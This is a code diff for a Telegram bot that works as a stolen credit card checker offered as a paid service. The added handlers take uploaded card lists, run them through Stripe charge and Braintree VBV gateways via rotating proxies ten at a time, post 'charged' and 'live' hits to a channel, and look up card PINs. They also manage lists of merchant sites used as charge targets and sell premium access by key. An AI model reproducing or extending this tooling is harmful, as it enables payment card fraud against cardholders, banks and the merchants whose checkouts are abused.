+            status_header = premium_emoji('❌ DECLINED')
+        pin_text = f"\n🔐 PIN: <code>{result['pin']}</code>" if result.get('pin') else ""
+        final_resp = f"""{status_header}\n\n💳 CC <code>{result['card']}</code>\n\n🪪 Gateway: VBV Braintree\n📝 Response: {result['message'][:150]}\n💰 Price: {result.get('price', '4$')}{pin_text}\n\n🆔 BIN: {brand} - {bin_type} - {level}\n🏦 Bank: {bank}\n🥰 Country: {country} {flag}"""
+        if result['status'] == '3DS':
+            await send_hit_to_channel(result['card'], '3DS', result['message'], 'VBV Braintree', '4$')
+        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+# ===================== BATCH STRIPE CHARGE =====================
+@bot.on(events.NewMessage(pattern=r'/ran_st$'))
+async def batch_stripe_charge(event):
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
+        return
+    if not event.reply_to_msg_id:
+        await event.reply(premium_emoji("❌ Reply to a .txt file with cards\n\n📝 Usage: /ran_st (reply to .txt)"), parse_mode='html')
+        return
+    reply_msg = await event.get_reply_message()
+    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
+        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
+        return
+    file_path = await reply_msg.download_media()
+    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    cards = extract_cc(content)
+    os.remove(file_path)
+    if not cards:
+        await event.reply(premium_emoji("❌ No valid cards found"), parse_mode='html')
+        return
+    proxies = get_user_proxies(user_id)
+    status_msg = await event.reply(premium_emoji(f"👑 FAST Random Check (Stripe Charge)!\n📊 Total: {len(cards)}\n⚡ Speed: 10 simultaneously\n💰 Price: 1$"), parse_mode='html')
+    results = {'charged': [], 'approved': [], 'dead': []}
+    try:
+        batch_size = 10
+        for batch_start in range(0, len(cards), batch_size):
+            batch_cards = cards[batch_start:batch_start + batch_size]
+            tasks = [check_card_stripe_charge(c, random.choice(proxies) if proxies else None) for c in batch_cards]
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in batch_results:
+                if isinstance(r, Exception):
+                    continue
+                if r['status'] == 'Charged':
+                    results['charged'].append(r)
+                    await send_hit_to_channel(r['card'], 'Charged', r['message'], 'Stripe Charge', r.get('price', '1$'))
+                elif r['status'] == 'Approved':
+                    results['approved'].append(r)
+                    await send_hit_to_channel(r['card'], 'Approved', r['message'], 'Stripe Charge', r.get('price', '1$'))
+                else:
+                    results['dead'].append(r)
+            checked = len(results['charged']) + len(results['approved']) + len(results['dead'])
+            await status_msg.edit(premium_emoji(f"👑 Stripe Charge Progress\n✅ Checked: {checked}/{len(cards)}\n💎 Charged: {len(results['charged'])}\n🔥 Live: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"), parse_mode='html')
+        final = f"""✅ Check Complete!\n\n📊 Total: {len(cards)}\n💎 Charged: {len(results['charged'])}\n🔥 Live: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"""
+        await status_msg.edit(premium_emoji(final), parse_mode='html')
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+# ===================== BATCH VBV =====================
+@bot.on(events.NewMessage(pattern=r'/ran_vbv$'))
+async def batch_vbv(event):
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
+        return
+    if not event.reply_to_msg_id:
+        await event.reply(premium_emoji("❌ Reply to a .txt file with cards\n\n📝 Usage: /ran_vbv (reply to .txt)"), parse_mode='html')
+        return
+    reply_msg = await event.get_reply_message()
+    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
+        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
+        return
+    file_path = await reply_msg.download_media()
+    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    cards = extract_cc(content)
+    os.remove(file_path)
+    if not cards:
+        await event.reply(premium_emoji("❌ No valid cards found"), parse_mode='html')
+        return
+    status_msg = await event.reply(premium_emoji(f"🪪 FAST Random Check (VBV Braintree)!\n📊 Total: {len(cards)}\n⚡ Speed: 10 simultaneously\n💰 Price: 4$"), parse_mode='html')
+    results = {'approved': [], 'dead': []}
+    try:
+        batch_size = 10
+        for batch_start in range(0, len(cards), batch_size):
+            batch_cards = cards[batch_start:batch_start + batch_size]
+            tasks = [check_card_vbv(c) for c in batch_cards]
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in batch_results:
+                if isinstance(r, Exception):
+                    continue
+                if r['status'] == '3DS':
+                    results['approved'].append(r)
+                    await send_hit_to_channel(r['card'], '3DS', r['message'], 'VBV Braintree', '4$')
+                else:
+                    results['dead'].append(r)
+            checked = len(results['approved']) + len(results['dead'])
+            await status_msg.edit(premium_emoji(f"🪪 VBV Progress\n✅ Checked: {checked}/{len(cards)}\n✅ 3DS: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"), parse_mode='html')
+        final = f"""✅ Check Complete!\n\n📊 Total: {len(cards)}\n✅ 3DS: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"""
+        await status_msg.edit(premium_emoji(final), parse_mode='html')
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
+
+# ===================== PIN COMMAND =====================
+@bot.on(events.NewMessage(pattern=r'/pin\s+'))
+async def pin_command(event):
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
+        return
+    args = event.message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await event.reply(premium_emoji("❌ Usage: /pin <card_number>"), parse_mode='html')
+        return
+    card_number = args[1].strip().split('|')[0]
+    pin = await get_pin_for_card(card_number)
+    if pin:
+        await event.reply(premium_emoji(f"🔑 PIN Found!\n\n💳 Card: <code>{card_number}</code>\n🔐 PIN: <code>{pin}</code>"), parse_mode='html')
+    else:
+        await event.reply(premium_emoji(f"❌ No PIN found for <code>{card_number}</code>"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern='/chk'))
 async def check_command(event):
@@ -1850,6 +2454,84 @@ async def add_sites_command(event):
     except Exception as e:
         await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
 
+# ===================== STRIPE SITES MANAGEMENT =====================
+@bot.on(events.NewMessage(pattern='/addstripe'))
+async def add_stripe_sites(event):
+    user_id = event.sender_id
+    if user_id not in ADMIN_ID:
+        return
+    if not event.reply_to_msg_id:
+        await event.reply(premium_emoji("📝 Reply to a .txt file with Stripe sites\n\nUsage: /addstripe (reply to .txt)"), parse_mode='html')
+        return
+    reply_msg = await event.get_reply_message()
+    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
+        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
+        return
+    file_path = await reply_msg.download_media()
+    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+    sites = [line.strip() for line in content.splitlines() if line.strip()]
+    os.remove(file_path)
+    if not sites:
+        await event.reply(premium_emoji("❌ No valid sites found"), parse_mode='html')
+        return
+    # Load existing and add new
+    existing = load_stripe_sites()
+    added = 0
+    for site in sites:
+        if site not in existing:
+            existing.append(site)
+            added += 1
+    async with aiofiles.open(STRIPE_SITES_FILE, 'w') as f:
+        for s in existing:
+            await f.write(f"{s}\n")
+    await event.reply(premium_emoji(f"✅ Added {added} Stripe sites!\n📊 Total: {len(existing)}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern='/rmsite'))
+async def rm_stripe_site(event):
+    user_id = event.sender_id
+    if user_id not in ADMIN_ID:
+        return
+    args = event.message.text.split(maxsplit=1)
+    if len(args) < 2:
+        await event.reply(premium_emoji("❌ Usage: /rmsite <url>"), parse_mode='html')
+        return
+    site = args[1].strip()
+    sites = load_stripe_sites()
+    if site in sites:
+        sites.remove(site)
+        async with aiofiles.open(STRIPE_SITES_FILE, 'w') as f:
+            for s in sites:
+                await f.write(f"{s}\n")
+        await event.reply(premium_emoji(f"✅ Removed: {site}"), parse_mode='html')
+    else:
+        await event.reply(premium_emoji(f"❌ Site not found: {site}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern='/mysites'))
+async def list_stripe_sites(event):
+    user_id = event.sender_id
+    if user_id not in ADMIN_ID:
+        return
+    sites = load_stripe_sites()
+    shopify_sites = load_sites()
+    if not sites and not shopify_sites:
+        await event.reply(premium_emoji("📭 No sites added yet."), parse_mode='html')
+        return
+    text = ""
+    if shopify_sites:
+        text += f"<b>🛍️ Shopify Sites ({len(shopify_sites)}):</b>\n"
+        for s in shopify_sites[:10]:
+            text += f"  • {s}\n"
+        if len(shopify_sites) > 10:
+            text += f"  ... +{len(shopify_sites)-10} more\n"
+    if sites:
+        text += f"\n<b>👑 Stripe Sites ({len(sites)}):</b>\n"
+        for s in sites[:10]:
+            text += f"  • {s}\n"
+        if len(sites) > 10:
+            text += f"  ... +{len(sites)-10} more\n"
+    await event.reply(premium_emoji(text), parse_mode='html')
+
 @bot.on(events.NewMessage(pattern='/addpremium'))
 async def add_premium_command(event):
     user_id = event.sender_id
@@ -1857,20 +2539,22 @@ async def add_premium_command(event):
         return
     try:
         parts = event.raw_text.split()
-        if len(parts) != 2:
-            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/addpremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
+        if len(parts) < 2:
+            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/addpremium ᴜsᴇʀ_ɪᴅ [ʜᴏᴜʀs]</code>\n\n💡 If no hours = permanent"), parse_mode='html')
             return
         target_id = int(parts[1])
-        if await add_premium_user(target_id):
-            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode='html')
+        hours = int(parts[2]) if len(parts) > 2 else None
+        if await add_premium_user(target_id, hours=hours, added_by=user_id):
+            duration = f"for {hours} hours" if hours else "permanent"
+            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ({duration})!"), parse_mode='html')
             try:
-                await bot.send_message(target_id, premium_emoji("🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs! Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ɢʀᴀɴᴛᴇᴅ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʙᴏᴛ!"), parse_mode='html')
+                await bot.send_message(target_id, premium_emoji(f"🎉 Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ɢʀᴀɴᴛᴇᴅ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ({duration})!"), parse_mode='html')
             except:
                 pass
         else:
             await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
     except ValueError:
-        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
+        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID or hours."), parse_mode='html')
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
 
@@ -1977,7 +2661,7 @@ async def redeem_key(event):
             if is_premium(user_id):
                 await event.reply(premium_emoji("❌ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss!"), parse_mode='html')
                 return
-            await add_premium_user(user_id)
+            await add_premium_user(user_id, hours=key_data['hours'], added_by='key')
             key_data['used_count'] += 1
             key_data['used_by'].append(user_id_str)
             key_data['used_at'] = current_date.isoformat()
@@ -1985,9 +2669,27 @@ async def redeem_key(event):
             await save_keys(keys_data)
             hours_display = key_data['hours']
             days_display = f"{hours_display} hours" if hours_display < 24 else f"{hours_display // 24} days"
+            
+            # Notify user
             await event.reply(premium_emoji(f"""🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs!
 ⭐ Vɪᴘ Aᴄᴄᴇss Aᴄᴛɪᴠᴀᴛᴇᴅ! 📅 Dᴜʀᴀᴛɪᴏɴ: {days_display}
 """), parse_mode='html')
+            
+            # Notify admin channel
+            try:
+                sender = await event.get_sender()
+                username = f"@{sender.username}" if sender.username else sender.first_name or "Unknown"
+                admin_msg = f"""🔔 <b>Kᴇʏ Rᴇᴅᴇᴇᴍᴇᴅ</b>
+
+🔑 Kᴇʏ: <code>{key}</code>
+👤 Usᴇʀ: <code>{user_id}</code> | {username}
+⏰ Dᴜʀᴀᴛɪᴏɴ: {days_display}
+📅 Eɴᴅs: {(current_date + timedelta(hours=hours_display)).strftime('%Y-%m-%d %H:%M')}"""
+                print(f'[*] Sending admin notification to {HITS_CHANNEL_ID}')
+                await bot.send_message(HITS_CHANNEL_ID, premium_emoji(admin_msg), parse_mode='html')
+                print(f'[+] Admin notification sent!')
+            except Exception as e:
+                print(f'[-] Admin notification error: {e}')
     except Exception as e:
         await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
 
@@ -1996,12 +2698,63 @@ async def list_premium_command(event):
     user_id = event.sender_id
     if user_id not in ADMIN_ID:
         return
-    premium_users = load_premium_users()
-    if not premium_users:
+    data = load_premium_data()
+    now = datetime.now()
+    if not data:
         await event.reply(premium_emoji("📭 Nᴏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
         return
-    premium_list = "\n".join([f"• <code>{uid}</code>" for uid in premium_users])
-    await event.reply(premium_emoji(f"👑 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(premium_users)})</b>\n\n{premium_list}"), parse_mode='html')
+    
+    premium_list = ""
+    for uid, info in data.items():
+        try:
+            u = await bot.get_entity(int(uid))
+            username = f"@{u.username}" if u.username else u.first_name or "Unknown"
+        except:
+            username = "Unknown"
+        
+        expiry = info.get('expiry')
+        if not expiry:
+            time_left = "♾️ Pᴇʀᴍᴀɴᴇɴᴛ"
+        else:
+            exp_dt = datetime.fromisoformat(expiry)
+            if exp_dt < now:
+                time_left = "❌ EXPIRED"
+            else:
+                diff = exp_dt - now
+                hours = int(diff.total_seconds() // 3600)
+                mins = int((diff.total_seconds() % 3600) // 60)
+                time_left = f"⏰ {hours}h {mins}m"
+        
+        is_admin = "👑" if int(uid) in ADMIN_ID else ""
+        premium_list += f"\n{is_admin} <code>{uid}</code> | {username}\n   └ {time_left}\n"
+    
+    buttons = []
+    for uid in data.keys():
+        if int(uid) not in ADMIN_ID:
+            buttons.append([Button.inline(f"❌ Revoke {uid}", f"revoke_premium:{uid}".encode(), style="danger")])
+    
+    await event.reply(premium_emoji(f"👑 <b>Pʀᴇᴍɪᴜᴍ Usᴇʀs ({len(data)})</b>\n{premium_list}"), buttons=buttons if buttons else None, parse_mode='html')
+
+@bot.on(events.CallbackQuery(data=re.compile(r"revoke_premium:(\d+)")))
+async def revoke_premium_callback(event):
+    user_id = event.sender_id
+    if user_id not in ADMIN_ID:
+        await event.answer("⛔ Admin only!", alert=True)
+        return
+    
+    target_id = int(event.pattern_match.group(1))
+    if target_id in ADMIN_ID:
+        await event.answer("⚠️ Cannot revoke admin!", alert=True)
+        return
+    
+    if await remove_premium_user(target_id):
+        await event.answer(f"✅ Revoked {target_id}", alert=False)
+        try:
+            await bot.send_message(target_id, premium_emoji("⚠️ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ."), parse_mode='html')
+        except:
+            pass
+    else:
+        await event.answer("❌ User not found", alert=True)
 
 @bot.on(events.NewMessage(pattern='/stats'))
 async def stats_command(event):
@@ -3797,6 +4550,9 @@ async def _safe_edit(*args, **kwargs):
 bot.send_message = _safe_send
 bot.edit_message = _safe_edit
 
+bot.loop.create_task(token_checker_task())
+bot.loop.create_task(premium_checker_task())
+bot.loop.create_task(daily_stars_task())
 bot.run_until_disconnected()
 
 async def add_my_proxy(event):
